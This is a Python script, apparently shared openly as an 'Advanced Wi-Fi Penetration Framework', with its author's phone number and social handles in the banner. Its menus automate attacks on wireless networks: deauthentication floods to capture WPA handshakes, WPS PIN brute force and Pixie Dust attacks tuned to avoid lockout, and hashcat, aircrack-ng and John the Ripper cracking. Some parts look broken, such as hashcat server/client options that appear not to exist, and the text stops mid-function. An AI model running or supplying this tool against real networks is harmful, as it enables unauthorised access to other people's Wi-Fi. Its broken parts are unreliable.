#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Wi-Fi Penetration Testing Framework
Author: ATHEX
Version: 3.0
License: Educational Purpose Only
"""

import os
import sys
import time
import signal
import subprocess
import re
import json
import threading
import queue
from datetime import datetime
from pathlib import Path
from typing import Optional, Tuple, List, Dict
from dataclasses import dataclass
from enum import Enum
import colorama
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

# Color definitions
class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    BOLD = Style.BRIGHT
    RESET = Style.RESET_ALL
    BG_RED = Back.RED
    BG_GREEN = Back.GREEN
    BG_YELLOW = Back.YELLOW
    BG_BLUE = Back.BLUE

# Configuration
@dataclass
class Config:
    interface: str = "wlan0"
    monitor_interface: str = "wlan0mon"
    output_dir: Path = Path("/tmp/wifi_hack")
    handshake_dir: Path = Path("/tmp/wifi_hack/handshakes")
    wordlist_dir: Path = Path("/usr/share/wordlists")
    log_file: Path = Path("/tmp/wifi_hack/wifi_tool.log")
    timeout: int = 30
    
    def __post_init__(self):
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.handshake_dir.mkdir(parents=True, exist_ok=True)
        self.log_file.parent.mkdir(parents=True, exist_ok=True)

class AttackType(Enum):
    REAVER = "reaver"
    BULLY = "bully"
    PIXIE = "pixiewps"
    WIFITE = "wifite"

class WifiHackTool:
    def __init__(self):
        self.config = Config()
        self.running = True
        self.current_process = None
        self.setup_signal_handlers()
        self.load_banner()
        
    def setup_signal_handlers(self):
        """Setup signal handlers for graceful exit"""
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        """Handle Ctrl+C gracefully"""
        print(f"\n{Colors.YELLOW}[!] Interrupt received, cleaning up...{Colors.RESET}")
        self.running = False
        if self.current_process:
            self.current_process.terminate()
        sys.exit(0)
    
    def load_banner(self):
        """Load and display animated banner"""
        self.banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    █████╗ ████████╗██╗  ██╗███████╗██╗  ██╗    ██╗    ██╗██╗███████╗██╗     ║
║   ██╔══██╗╚══██╔══╝╚██╗██╔╝██╔════╝╚██╗██╔╝    ██║    ██║██║██╔════╝██║     ║
║   ███████║   ██║    ╚███╔╝ █████╗   ╚███╔╝     ██║ █╗ ██║██║█████╗  ██║     ║
║   ██╔══██║   ██║    ██╔██╗ ██╔══╝   ██╔██╗     ██║███╗██║██║██╔══╝  ██║     ║
║   ██║  ██║   ██║   ██╔╝ ██╗███████╗██╔╝ ██╗    ╚███╔███╔╝██║██║     ███████╗║
║   ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚══════╝║
║                                                                              ║
║                    ADVANCED WI-FI PENETRATION FRAMEWORK                       ║
║                              Version 3.0                                     ║
║                         Created by: ATHEX                                     ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  {Colors.YELLOW}Contact:{Colors.CYAN} WhatsApp: +92 349 0916663 | IG: itx_athex86 | YT: inziXploit444{Colors.RESET}  ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}"""
    
    def print_banner(self):
        """Print the banner"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(self.banner)
    
    def log(self, message: str, level: str = "INFO"):
        """Log messages with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        color_map = {
            "INFO": Colors.CYAN,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED,
            "DEBUG": Colors.MAGENTA
        }
        color = color_map.get(level, Colors.WHITE)
        print(f"{color}[{timestamp}] [{level}] {message}{Colors.RESET}")
        
        # Write to log file
        with open(self.config.log_file, 'a') as f:
            f.write(f"[{timestamp}] [{level}] {message}\n")
    
    def run_command(self, command: str, shell: bool = True, timeout: int = None) -> Optional[subprocess.CompletedProcess]:
        """Execute command with enhanced error handling"""
        try:
            self.log(f"Executing: {command}", "DEBUG")
            
            if timeout is None:
                timeout = self.config.timeout
            
            if shell:
                result = subprocess.run(
                    command, 
                    shell=True, 
                    check=False,
                    capture_output=True, 
                    text=True,
                    timeout=timeout
                )
            else:
                result = subprocess.run(
                    command.split(), 
                    check=False,
                    capture_output=True, 
                    text=True,
                    timeout=timeout
                )
            
            if result.returncode == 0:
                return result
            else:
                self.log(f"Command failed with exit code {result.returncode}", "WARNING")
                if result.stderr:
                    self.log(f"Error: {result.stderr.strip()}", "ERROR")
                return None
                
        except subprocess.TimeoutExpired:
            self.log(f"Command timed out after {timeout} seconds", "ERROR")
            return None
        except Exception as e:
            self.log(f"Unexpected error: {e}", "ERROR")
            return None
    
    def check_root(self) -> bool:
        """Check if running as root"""
        if os.geteuid() != 0:
            self.log("This script must be run as root!", "ERROR")
            return False
        return True
    
    def check_dependencies(self) -> Tuple[bool, List[str]]:
        """Check if required tools are installed"""
        required_tools = ["aircrack-ng", "reaver", "bully", "wifite"]
        missing_tools = []
        
        for tool in required_tools:
            result = self.run_command(f"which {tool}", timeout=5)
            if not result or result.returncode != 0:
                missing_tools.append(tool)
        
        if missing_tools:
            self.log(f"Missing tools: {', '.join(missing_tools)}", "WARNING")
            return False, missing_tools
        return True, []
    
    def get_interface(self, prompt: str = "Enter interface") -> str:
        """Get interface with validation"""
        while True:
            interface = input(f"{Colors.CYAN}{prompt} (default: {self.config.interface}): {Colors.RESET}").strip()
            if not interface:
                interface = self.config.interface
            
            # Check if interface exists
            result = self.run_command(f"ip link show {interface}", timeout=5)
            if result:
                return interface
            else:
                self.log(f"Interface {interface} not found. Please try again.", "ERROR")
    
    def get_bssid(self) -> str:
        """Get BSSID with validation"""
        bssid_pattern = re.compile(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$')
        while True:
            bssid = input(f"{Colors.CYAN}Enter target BSSID (XX:XX:XX:XX:XX:XX): {Colors.RESET}").strip().upper()
            if bssid_pattern.match(bssid):
                return bssid
            else:
                self.log("Invalid BSSID format. Please use format: XX:XX:XX:XX:XX:XX", "ERROR")
    
    def kill_conflicting_processes(self):
        """Kill processes that might interfere with monitor mode"""
        conflicting = ["NetworkManager", "dhclient", "wpa_supplicant"]
        for proc in conflicting:
            self.run_command(f"killall {proc} 2>/dev/null", timeout=5)
        self.log("Conflicting processes killed", "SUCCESS")
    
    def start_monitor_mode(self):
        """Start monitor mode with enhanced handling"""
        if not self.check_root():
            return
        
        interface = self.get_interface()
        self.log(f"Starting monitor mode on {interface}...", "INFO")
        
        # Kill conflicting processes
        self.kill_conflicting_processes()
        
        # Start monitor mode
        commands = [
            f"airmon-ng start {interface}",
            f"ip link set {interface} down",
            f"iwconfig {interface} mode monitor",
            f"ip link set {interface} up"
        ]
        
        for cmd in commands:
            result = self.run_command(cmd, timeout=10)
            if not result and "airmon-ng" in cmd:
                self.log(f"Failed to start monitor mode with {cmd}", "WARNING")
        
        # Check if monitor interface exists
        time.sleep(2)
        monitor_int = f"{interface}mon"
        result = self.run_command(f"iwconfig {monitor_int}", timeout=5)
        if result:
            self.config.monitor_interface = monitor_int
            self.log(f"✓ Monitor mode started successfully on {monitor_int}", "SUCCESS")
        else:
            self.log("Failed to start monitor mode", "ERROR")
        
        time.sleep(2)
    
    def stop_monitor_mode(self):
        """Stop monitor mode"""
        if not self.check_root():
            return
        
        interface = self.get_interface("Enter monitor interface")
        self.log(f"Stopping monitor mode on {interface}...", "INFO")
        
        commands = [
            f"airmon-ng stop {interface}",
            f"iwconfig {interface} mode managed",
            "systemctl restart NetworkManager",
            "systemctl restart networking"
        ]
        
        for cmd in commands:
            self.run_command(cmd, timeout=10)
        
        self.log("✓ Monitor mode stopped and services restarted", "SUCCESS")
        time.sleep(2)
    
    def scan_networks(self):
        """Enhanced network scanning with live output"""
        if not self.check_root():
            return
        
        interface = self.get_interface("Enter interface for scanning")
        self.log(f"Scanning networks with {interface}...", "INFO")
        self.log("Press Ctrl+C to stop scanning", "WARNING")
        
        try:
            # Use airodump-ng with filtering
            cmd = f"airodump-ng {interface} -w {self.config.output_dir}/scan --output-format csv"
            self.current_process = subprocess.Popen(
                cmd.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            self.current_process.wait()
        except KeyboardInterrupt:
            self.log("\nScan stopped by user", "WARNING")
            if self.current_process:
                self.current_process.terminate()
        finally:
            self.current_process = None
        
        # Parse and display results
        self.parse_scan_results()
        time.sleep(2)
    
    def parse_scan_results(self):
        """Parse and display scan results in a table"""
        csv_file = self.config.output_dir / "scan-01.csv"
        if not csv_file.exists():
            return
        
        networks = []
        try:
            with open(csv_file, 'r') as f:
                for line in f:
                    if line.startswith('BSSID'):
                        continue
                    parts = line.strip().split(',')
                    if len(parts) > 10 and parts[0].startswith(' '):
                        continue
                    if parts[0] and ':' in parts[0]:
                        networks.append({
                            'bssid': parts[0],
                            'channel': parts[3],
                            'encryption': parts[5] if len(parts) > 5 else 'Unknown',
                            'essid': parts[13] if len(parts) > 13 else '<hidden>'
                        })
            
            if networks:
                print(f"\n{Colors.GREEN}{'='*80}")
                print(f"{'BSSID':<20} {'Channel':<10} {'Encryption':<15} {'ESSID':<30}")
                print(f"{'='*80}{Colors.RESET}")
                for net in networks[:20]:  # Show top 20
                    print(f"{Colors.CYAN}{net['bssid']:<20} "
                          f"{Colors.YELLOW}{net['channel']:<10} "
                          f"{Colors.MAGENTA}{net['encryption']:<15} "
                          f"{Colors.WHITE}{net['essid']:<30}{Colors.RESET}")
                print(f"{Colors.GREEN}{'='*80}{Colors.RESET}")
                self.log(f"Found {len(networks)} networks", "SUCCESS")
            else:
                self.log("No networks found", "WARNING")
                
        except Exception as e:
            self.log(f"Error parsing scan results: {e}", "ERROR")
    
    def capture_handshake(self):
        """Enhanced handshake capture with progress tracking"""
        if not self.check_root():
            return
        
        interface = self.get_interface()
        
        # First scan for networks
        self.log("Scanning for networks...", "INFO")
        self.log("Press Ctrl+C when you find your target", "WARNING")
        
        try:
            self.run_command(f"airodump-ng {interface}", timeout=30)
        except KeyboardInterrupt:
            pass
        
        bssid = self.get_bssid()
        channel = input(f"{Colors.CYAN}Enter channel: {Colors.RESET}").strip()
        
        # Generate output filename
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.config.handshake_dir / f"handshake_{timestamp}"
        
        self.log(f"Starting handshake capture on {bssid}...", "INFO")
        self.log("Waiting for handshake...", "INFO")
        
        # Start airodump in background
        airodump_cmd = f"airodump-ng {interface} --bssid {bssid} -c {channel} -w {output_file}"
        
        # Start deauth attack in separate thread
        def deauth_attack():
            time.sleep(5)
            deauth_cmd = f"aireplay-ng -0 10 -a {bssid} {interface}"
            self.run_command(deauth_cmd, timeout=30)
        
        attack_thread = threading.Thread(target=deauth_attack)
        attack_thread.start()
        
        # Run airodump
        try:
            self.run_command(airodump_cmd, timeout=60)
        except KeyboardInterrupt:
            self.log("Capture stopped by user", "WARNING")
        
        attack_thread.join(timeout=10)
        
        # Check if handshake was captured
        cap_file = Path(f"{output_file}-01.cap")
        if cap_file.exists():
            self.log(f"✓ Handshake captured and saved to: {cap_file}", "SUCCESS")
        else:
            self.log("No handshake captured. Try again.", "WARNING")
        
        time.sleep(2)
    
    def advanced_wordlist_management(self):
        """Advanced wordlist management menu"""
        while True:
            self.print_banner()
            print(f"""
{Colors.BOLD}{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗
║                 ADVANCED WORDLIST MANAGER                  ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.GREEN}[1]{Colors.RESET} Create wordlist with Crunch
{Colors.GREEN}[2]{Colors.RESET} Create wordlist with Cupp (Custom user profiling)
{Colors.GREEN}[3]{Colors.RESET} Create wordlist from existing passwords
{Colors.GREEN}[4]{Colors.RESET} Merge multiple wordlists
{Colors.GREEN}[5]{Colors.RESET} Clean/Filter wordlist (remove duplicates, sort)
{Colors.GREEN}[6]{Colors.RESET} Wordlist statistics
{Colors.GREEN}[7]{Colors.RESET} Download common wordlists
{Colors.RED}[0]{Colors.RESET} Back to Main Menu
            """)
            
            choice = input(f"{Colors.CYAN}Choice: {Colors.RESET}").strip()
            
            if choice == "1":
                self.create_crunch_wordlist()
            elif choice == "2":
                self.create_cupp_wordlist()
            elif choice == "3":
                self.create_from_passwords()
            elif choice == "4":
                self.merge_wordlists()
            elif choice == "5":
                self.clean_wordlist()
            elif choice == "6":
                self.wordlist_statistics()
            elif choice == "7":
                self.download_wordlists()
            elif choice == "0":
                break
    
    def create_crunch_wordlist(self):
        """Create wordlist using crunch with advanced options"""
        self.print_banner()
        print(f"{Colors.BOLD}{Colors.CYAN}Crunch Wordlist Generator{Colors.RESET}\n")
        
        try:
            min_len = int(input(f"{Colors.CYAN}Minimum length: {Colors.RESET}"))
            max_len = int(input(f"{Colors.CYAN}Maximum length: {Colors.RESET}"))
            
            print(f"""
{Colors.YELLOW}Character sets:{Colors.RESET}
1) Lowercase
2) Uppercase
3) Numbers
4) Symbols
5) Lowercase + Numbers
6) Uppercase + Numbers
7) All (Letters + Numbers + Symbols)
8) Custom
            """)
            
            choice = input(f"{Colors.CYAN}Choice (1-8): {Colors.RESET}").strip()
            
            charsets = {
                "1": "abcdefghijklmnopqrstuvwxyz",
                "2": "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
                "3": "0123456789",
                "4": "!@#$%^&*()_+-=[]{}|;:,.<>?",
                "5": "abcdefghijklmnopqrstuvwxyz0123456789",
                "6": "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
                "7": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
            }
            
            charset = charsets.get(choice)
            if choice == "8":
                charset = input(f"{Colors.CYAN}Enter custom charset: {Colors.RESET}")
            elif not charset:
                self.log("Invalid choice", "ERROR")
                return
            
            output_file = input(f"{Colors.CYAN}Output file path: {Colors.RESET}")
            
            self.log("Generating wordlist... This may take a while", "INFO")
            cmd = f"crunch {min_len} {max_len} {charset} -o {output_file}"
            
            result = self.run_command(cmd, timeout=None)
            if result:
                self.log(f"✓ Wordlist created: {output_file}", "SUCCESS")
            else:
                self.log("Failed to create wordlist", "ERROR")
                
        except ValueError:
            self.log("Invalid number", "ERROR")
        
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def create_cupp_wordlist(self):
        """Create wordlist using Cupp for targeted attacks"""
        self.log("Cupp not installed. Installing...", "INFO")
        self.run_command("apt-get install -y cupp", timeout=120)
        
        self.log("Starting Cupp interactive mode...", "INFO")
        self.run_command("cupp -i", timeout=None)
    
    def create_from_passwords(self):
        """Create wordlist from existing password files"""
        file_path = input(f"{Colors.CYAN}Enter password file path: {Colors.RESET}")
        if not os.path.exists(file_path):
            self.log("File not found", "ERROR")
            return
        
        output_file = input(f"{Colors.CYAN}Output file path: {Colors.RESET}")
        
        # Extract unique passwords and apply mutations
        self.log("Processing passwords...", "INFO")
        
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = set(f.read().splitlines())
        
        self.log(f"Found {len(passwords)} unique passwords", "SUCCESS")
        
        # Apply common mutations
        mutations = []
        for pwd in passwords:
            mutations.append(pwd)
            mutations.append(pwd.capitalize())
            mutations.append(pwd.upper())
            mutations.append(pwd.lower())
            mutations.append(pwd + "123")
            mutations.append(pwd + "!")
        
        mutations = list(set(mutations))
        
        with open(output_file, 'w') as f:
            f.write('\n'.join(mutations))
        
        self.log(f"✓ Created wordlist with {len(mutations)} entries", "SUCCESS")
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def merge_wordlists(self):
        """Merge multiple wordlists"""
        files = []
        while True:
            file = input(f"{Colors.CYAN}Enter wordlist path (or 'done' to finish): {Colors.RESET}")
            if file.lower() == 'done':
                break
            if os.path.exists(file):
                files.append(file)
            else:
                self.log("File not found", "ERROR")
        
        if not files:
            return
        
        output_file = input(f"{Colors.CYAN}Output file path: {Colors.RESET}")
        
        # Merge and remove duplicates
        all_words = set()
        for file in files:
            with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                words = f.read().splitlines()
                all_words.update(words)
                self.log(f"Added {len(words)} words from {file}", "INFO")
        
        with open(output_file, 'w') as f:
            f.write('\n'.join(sorted(all_words)))
        
        self.log(f"✓ Merged {len(all_words)} unique words to {output_file}", "SUCCESS")
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def clean_wordlist(self):
        """Clean and filter wordlist"""
        file_path = input(f"{Colors.CYAN}Enter wordlist path: {Colors.RESET}")
        if not os.path.exists(file_path):
            self.log("File not found", "ERROR")
            return
        
        # Read words
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            words = f.read().splitlines()
        
        original_count = len(words)
        
        # Remove duplicates
        words = list(set(words))
        
        # Sort
        words.sort()
        
        # Filter by length
        min_len = input(f"{Colors.CYAN}Minimum length (press Enter to skip): {Colors.RESET}")
        max_len = input(f"{Colors.CYAN}Maximum length (press Enter to skip): {Colors.RESET}")
        
        if min_len:
            words = [w for w in words if len(w) >= int(min_len)]
        if max_len:
            words = [w for w in words if len(w) <= int(max_len)]
        
        output_file = input(f"{Colors.CYAN}Output file path: {Colors.RESET}")
        
        with open(output_file, 'w') as f:
            f.write('\n'.join(words))
        
        self.log(f"Original: {original_count} words", "INFO")
        self.log(f"After cleaning: {len(words)} words", "SUCCESS")
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def wordlist_statistics(self):
        """Display wordlist statistics"""
        file_path = input(f"{Colors.CYAN}Enter wordlist path: {Colors.RESET}")
        if not os.path.exists(file_path):
            self.log("File not found", "ERROR")
            return
        
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            words = f.read().splitlines()
        
        lengths = [len(w) for w in words]
        
        print(f"""
{Colors.GREEN}Wordlist Statistics:{Colors.RESET}
Total words: {len(words)}
Unique words: {len(set(words))}
Average length: {sum(lengths)/len(lengths):.2f}
Min length: {min(lengths)}
Max length: {max(lengths)}
File size: {os.path.getsize(file_path) / (1024*1024):.2f} MB
        """)
        
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def download_wordlists(self):
        """Download common wordlists"""
        wordlists = {
            "rockyou": "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
            "SecLists": "https://github.com/danielmiessler/SecLists/archive/master.zip",
            "probable": "https://github.com/berzerk0/Probable-Wordlists/archive/master.zip"
        }
        
        print(f"\n{Colors.GREEN}Available wordlists:{Colors.RESET}")
        for i, (name, url) in enumerate(wordlists.items(), 1):
            print(f"{Colors.CYAN}[{i}]{Colors.RESET} {name}")
        
        choice = input(f"{Colors.CYAN}Choice: {Colors.RESET}")
        
        if choice == "1":
            self.log("Downloading rockyou.txt...", "INFO")
            self.run_command(f"wget {wordlists['rockyou']} -O /usr/share/wordlists/rockyou.txt", timeout=None)
        elif choice == "2":
            self.log("Downloading SecLists...", "INFO")
            self.run_command(f"wget {wordlists['SecLists']} -O /tmp/SecLists.zip", timeout=None)
            self.run_command("unzip /tmp/SecLists.zip -d /usr/share/wordlists/", timeout=None)
        elif choice == "3":
            self.log("Downloading Probable Wordlists...", "INFO")
            self.run_command(f"wget {wordlists['probable']} -O /tmp/Probable-Wordlists.zip", timeout=None)
            self.run_command("unzip /tmp/Probable-Wordlists.zip -d /usr/share/wordlists/", timeout=None)
        
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def advanced_cracking_menu(self):
        """Advanced password cracking menu"""
        while True:
            self.print_banner()
            print(f"""
{Colors.BOLD}{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗
║                ADVANCED CRACKING MENU                       ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.GREEN}[1]{Colors.RESET} Crack with Hashcat (GPU accelerated)
{Colors.GREEN}[2]{Colors.RESET} Crack with Aircrack-ng (CPU)
{Colors.GREEN}[3]{Colors.RESET} Crack with John the Ripper
{Colors.GREEN}[4]{Colors.RESET} Mask attack with Hashcat
{Colors.GREEN}[5]{Colors.RESET} Rule-based attack
{Colors.GREEN}[6]{Colors.RESET} Hybrid attack
{Colors.GREEN}[7]{Colors.RESET} Distributed cracking setup
{Colors.RED}[0]{Colors.RESET} Back to Main Menu
            """)
            
            choice = input(f"{Colors.CYAN}Choice: {Colors.RESET}").strip()
            
            if choice == "1":
                self.hashcat_crack()
            elif choice == "2":
                self.aircrack_crack()
            elif choice == "3":
                self.john_crack()
            elif choice == "4":
                self.mask_attack()
            elif choice == "5":
                self.rule_attack()
            elif choice == "6":
                self.hybrid_attack()
            elif choice == "7":
                self.distributed_cracking()
            elif choice == "0":
                break
    
    def hashcat_crack(self):
        """Crack using Hashcat with GPU support"""
        handshake_file = input(f"{Colors.CYAN}Enter handshake file (.cap or .hccapx): {Colors.RESET}")
        wordlist = input(f"{Colors.CYAN}Enter wordlist path: {Colors.RESET}")
        
        # Convert cap to hccapx if needed
        if handshake_file.endswith('.cap'):
            self.log("Converting to hashcat format...", "INFO")
            self.run_command(f"cap2hccapx {handshake_file} {handshake_file}.hccapx", timeout=60)
            handshake_file = f"{handshake_file}.hccapx"
        
        # Detect hash type
        self.log("Detecting hash type...", "INFO")
        
        cmd = f"hashcat -m 2500 {handshake_file} {wordlist} --force -O -w 3"
        self.log("Starting Hashcat... Press Ctrl+C to stop", "INFO")
        self.run_command(cmd, timeout=None)
        
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def aircrack_crack(self):
        """Crack using Aircrack-ng"""
        handshake_file = input(f"{Colors.CYAN}Enter handshake file (.cap): {Colors.RESET}")
        wordlist = input(f"{Colors.CYAN}Enter wordlist path: {Colors.RESET}")
        
        self.log("Starting Aircrack-ng...", "INFO")
        self.run_command(f"aircrack-ng {handshake_file} -w {wordlist}", timeout=None)
        
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def john_crack(self):
        """Crack using John the Ripper"""
        handshake_file = input(f"{Colors.CYAN}Enter handshake file (.cap): {Colors.RESET}")
        
        # Convert to john format
        self.log("Converting to John format...", "INFO")
        self.run_command(f"cap2john {handshake_file} > {handshake_file}.john", timeout=60)
        
        self.log("Starting John the Ripper...", "INFO")
        self.run_command(f"john {handshake_file}.john --wordlist=/usr/share/wordlists/rockyou.txt", timeout=None)
        
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def mask_attack(self):
        """Mask attack with Hashcat"""
        handshake_file = input(f"{Colors.CYAN}Enter handshake file: {Colors.RESET}")
        
        print(f"""
{Colors.YELLOW}Mask Examples:{Colors.RESET}
?l = lowercase
?u = uppercase
?d = digit
?s = special
?a = all

Example: ?l?l?l?l?d?d?d (4 letters + 3 numbers)
        """)
        
        mask = input(f"{Colors.CYAN}Enter mask: {Colors.RESET}")
        
        cmd = f"hashcat -m 2500 {handshake_file} -a 3 {mask} --force -O"
        self.run_command(cmd, timeout=None)
        
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def rule_attack(self):
        """Rule-based attack"""
        handshake_file = input(f"{Colors.CYAN}Enter handshake file: {Colors.RESET}")
        wordlist = input(f"{Colors.CYAN}Enter wordlist path: {Colors.RESET}")
        
        print(f"""
{Colors.YELLOW}Available rule sets:{Colors.RESET}
1) best64.rule
2) d3ad0ne.rule
3) toggles3.rule
4) toggles5.rule
5) OneRuleToRuleThemAll.rule
        """)
        
        choice = input(f"{Colors.CYAN}Choice: {Colors.RESET}")
        rules = {
            "1": "best64.rule",
            "2": "d3ad0ne.rule",
            "3": "toggles3.rule",
            "4": "toggles5.rule",
            "5": "OneRuleToRuleThemAll.rule"
        }
        
        rule = rules.get(choice, "best64.rule")
        cmd = f"hashcat -m 2500 {handshake_file} {wordlist} -r {rule} --force -O"
        self.run_command(cmd, timeout=None)
        
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def hybrid_attack(self):
        """Hybrid dictionary + mask attack"""
        handshake_file = input(f"{Colors.CYAN}Enter handshake file: {Colors.RESET}")
        wordlist = input(f"{Colors.CYAN}Enter wordlist path: {Colors.RESET}")
        mask = input(f"{Colors.CYAN}Enter mask for suffix/prefix: {Colors.RESET}")
        
        # Hybrid attack: dictionary + mask
        cmd = f"hashcat -m 2500 {handshake_file} {wordlist} -a 6 {mask} --force -O"
        self.run_command(cmd, timeout=None)
        
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def distributed_cracking(self):
        """Setup distributed cracking"""
        self.log("Setting up distributed cracking...", "INFO")
        self.log("This requires Hashcat and a network setup", "WARNING")
        
        print(f"""
{Colors.YELLOW}Distributed Cracking Setup:{Colors.RESET}

1) Master node setup (server)
2) Slave node setup (client)
        """)
        
        choice = input(f"{Colors.CYAN}Choice: {Colors.RESET}")
        
        if choice == "1":
            port = input(f"{Colors.CYAN}Enter port (default 1337): {Colors.RESET}")
            port = port if port else "1337"
            self.log(f"Starting Hashcat master on port {port}", "INFO")
            self.run_command(f"hashcat --server -p {port}", timeout=None)
        elif choice == "2":
            server = input(f"{Colors.CYAN}Enter server IP: {Colors.RESET}")
            port = input(f"{Colors.CYAN}Enter port: {Colors.RESET}")
            handshake = input(f"{Colors.CYAN}Enter handshake file: {Colors.RESET}")
            wordlist = input(f"{Colors.CYAN}Enter wordlist: {Colors.RESET}")
            
            cmd = f"hashcat --client -s {server} -p {port} -m 2500 {handshake} {wordlist}"
            self.run_command(cmd, timeout=None)
        
        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def wps_attacks_advanced(self):
        """Advanced WPS attacks menu"""
        if not self.check_root():
            return
        
        while True:
            self.print_banner()
            print(f"""
{Colors.BOLD}{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗
║                 ADVANCED WPS ATTACKS                         ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.GREEN}[1]{Colors.RESET} Reaver with Pixie Dust
{Colors.GREEN}[2]{Colors.RESET} Reaver with custom delays (avoid lockout)
{Colors.GREEN}[3]{Colors.RESET} Bully with all options
{Colors.GREEN}[4]{Colors.RESET} WPS PIN brute force
{Colors.GREEN}[5]{Colors.RESET} WPS PIN generator (based on MAC)
{Colors.GREEN}[6]{Colors.RESET} WPS vulnerability scanner
{Colors.GREEN}[7]{Colors.RESET} Automated WPS attack (multi-target)
{Colors.RED}[0]{Colors.RESET} Back to Main Menu
            """)
            
            choice = input(f"{Colors.CYAN}Choice: {Colors.RESET}").strip()
            
            interface = self.get_interface()
            monitor_int = f"{interface}mon"
            
            if choice == "1":
                bssid = self.get_bssid()
                self.log("Starting Reaver with Pixie Dust...", "INFO")
                cmd = f"reaver -i {monitor_int} -b {bssid} -vv -K 1"
                self.run_command(cmd, timeout=None)
            elif choice == "2":
                bssid = self.get_bssid()
                delay = input(f"{Colors.CYAN}Enter delay between attempts (seconds): {Colors.RESET}")
                cmd = f"reaver -i {monitor_int} -b {bssid} -vv -d {delay} -L -N"
                self.run_command(cmd, timeout=None)
            elif choice == "3":
                bssid = self.get_bssid()
                channel = input(f"{Colors.CYAN}Enter channel: {Colors.RESET}")
                cmd = f"bully {monitor_int} -b {bssid} -c {channel} -v 3 -S -F"
                self.run_command(cmd, timeout=None)
            elif choice == "4":
                bssid = self.get_bssid()
                pin = input(f"{Colors.CYAN}Start from PIN (or press Enter for default): {Colors.RESET}")
                if pin:
                    cmd = f"reaver -i {monitor_int} -b {bssid} -p {pin} -vv"
                else:
                    cmd = f"reaver -i {monitor_int} -b {bssid} -vv"
                self.run_command(cmd, timeout=None)
            elif choice == "5":
                bssid = self.get_bssid()
                self.log("Generating possible WPS PINs...", "INFO")
                self.generate_wps_pins(bssid)
            elif choice == "6":
                self.scan_wps_vulnerabilities()
            elif choice == "7":
                self.auto_wps_attack()
            elif choice == "0":
                break
            
            input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.RESET}")
    
    def generate_wps_pins(self, bssid: str):
        """Generate WPS PINs based on MAC address"""
        mac = bssid.replace(':', '').upper()
        
        # Known algorithms
        pins = []
        
        # Default PIN algorithm (Zhao Chunsheng)
        if len(mac) == 12:
            try:
                pin = int(mac[-6:], 16) % 10000000
                pins.append(f"{pin:08d}")
            except:
                pass
            
            # Arcadyan algorithm
            try:
                pin = int(mac[-4:], 16) % 10000
                pins.append(f"{pin:08d}")
            except:
                pass
            
            # Computed PINs
            pins.append("12345670")
            pins.append("00000000")
            pins.append("12345678")
            
        # Save to file
        output_file = self.config.output_dir / f"wps_pins_{bssid.replace(':', '_')}.txt"
        with open(output_file, 'w') as f:
            f.write('\n'.join(pins))
        
        self.log(f"Generated {len(pins)} PINs saved to {output_file}", "SUCCESS")
    
    def scan_wps_vulnerabilities(self):
        """Scan for WPS vulnerabilities"""
        interface = self.get_interface()
        monitor_int = f"{interface}mon"
        
        self.log("Scanning for WPS vulnerabilities...", "INFO")
        
        # Use wash to scan for WPS
        cmd = f"wash -i {monitor_int} -C"
        self.run_command(cmd, timeout=30)
        
        bssid = self.get_bssid()
        
        # Check for specific vulnerabilities
        self.log(f"Checking {bssid} for vulnerabilities...", "INFO")
        
        # Check for Pixie Dust vulnerability
        cmd = f"reaver -i {monitor_int} -b {bssid} -K 1 -vv -c 1"
